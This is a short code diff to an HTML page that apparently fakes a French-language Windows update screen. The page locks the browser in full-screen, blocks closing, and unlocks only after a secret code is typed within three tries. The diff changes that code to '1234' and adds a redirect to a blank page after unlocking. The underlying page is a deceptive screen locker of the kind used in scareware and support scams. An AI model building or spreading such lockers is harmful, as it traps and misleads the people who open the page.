@@ -77,7 +77,7 @@
         <p id="error-message"></p>
     </div>
     <script>
-        const SECRET_CODE = "windowsupdate123";
+        const SECRET_CODE = "1234";
         let attempts = 0;
         const maxAttempts = 3;function startLockdown() {
         requestFullScreen();
@@ -130,6 +130,9 @@
     function unlockSystem() {
         document.exitFullscreen();
         document.body.innerHTML = "<h1 style='color: green;'>✅ Mise à jour terminée</h1>";
+        setTimeout(() => {
+            window.location.href = "about:blank";
+        }, 3000);
     }
 
     function preventClose() {
